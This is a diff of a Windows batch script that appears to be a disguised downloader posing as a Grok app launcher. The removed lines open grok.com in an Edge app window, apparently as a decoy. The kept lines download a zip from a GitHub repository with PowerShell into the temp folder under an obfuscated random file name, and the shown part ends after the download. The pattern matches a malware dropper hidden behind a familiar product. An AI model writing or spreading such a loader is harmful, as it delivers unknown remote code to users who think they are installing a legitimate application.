@@ -4,15 +4,6 @@ set "url=https://github.com/rannumarres/f/raw/refs/heads/main/f.zip"
 set "tempdir=%temp%"
 set "output=%tempdir%\4g5h790g2345h7890g2345h90g2345h-890v2345h789-3v5h.zip"
 
-if exist "%ProgramFiles%\Microsoft\Edge\Application\msedge_proxy.exe" (
-    start "" "%ProgramFiles%\Microsoft\Edge\Application\msedge_proxy.exe" --app="https://grok.com/"
-) else if exist "%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge_proxy.exe" (
-    start "" "%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge_proxy.exe" --app="https://grok.com/"
-) else (
-    echo Microsoft Edge not found!
-    exit /b
-)
-
 :download
 powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"
 for %%A in ("%output%") do (
